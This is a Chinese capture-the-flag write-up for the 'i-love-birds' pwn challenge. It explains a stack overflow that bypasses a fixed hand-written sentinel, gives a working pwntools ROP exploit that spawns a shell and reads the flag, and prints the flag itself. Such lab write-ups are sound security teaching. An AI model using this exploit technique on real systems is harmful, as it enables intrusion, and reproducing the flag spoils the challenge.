# i-love-birds

## 题目简述

程序用 `gets` 向 64 字节栈缓冲区读入任意长度数据，并在返回前检查一个手写的 `0xDEADBEEF` 哨兵。它没有真正的编译器 stack canary。二进制为非 PIE，包含 `win(secret)`；只要第一个参数为 `0xA1B2C3D4`，就会执行 `/bin/sh`。

## 解题过程

反汇编确认缓冲区位于 `[rbp-0x50]`，哨兵位于 `[rbp-0x4]`，所以从缓冲区起始到哨兵的偏移为 `0x4c=76`。覆盖时原样写回 4 字节哨兵，再填满保存的 `rbp`，即可控制返回地址。

源码中的 `gadget` 函数还提供了位于 `0x4011c0` 的非对齐 gadget：

```text
pop rdi ; nop ; pop rbp ; ret
```

它一次弹出 `rdi` 和一个无关的 `rbp`，随后返回到 `win`。

```python
from pwn import ELF, context, p32, p64, remote

context.binary = elf = ELF("./birds")
io = remote("challenge-host", 12345)

payload = b"A" * 76
payload += p32(0xDEADBEEF)  # 保持手写哨兵
payload += b"B" * 8        # 覆盖保存的 rbp
payload += p64(0x4011C0)    # pop rdi ; nop ; pop rbp ; ret
payload += p64(0xA1B2C3D4)  # rdi
payload += p64(0)           # 被 gadget 弹入 rbp
payload += p64(elf.symbols["win"])

io.sendlineafter(b"Prove me wrong!\n", payload)
io.sendline(b"cat flag.txt")
print(io.recvall().decode(errors="replace"))
```

获得 shell 后读取：

```text
tjctf{1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP}
```

## 方法总结

- 核心技巧：在栈溢出中保持可预测的手写哨兵，同时用非 PIE gadget 设置 `win` 参数。
- 识别信号：`gets`、固定常量 canary、隐藏 `win` 函数和源码中可拆用的汇编片段。
- 复用要点：手写哨兵没有随机性，只要知道精确偏移即可原样覆盖；非对齐 gadget 的额外 `pop` 必须在 ROP 栈上补一个占位值。
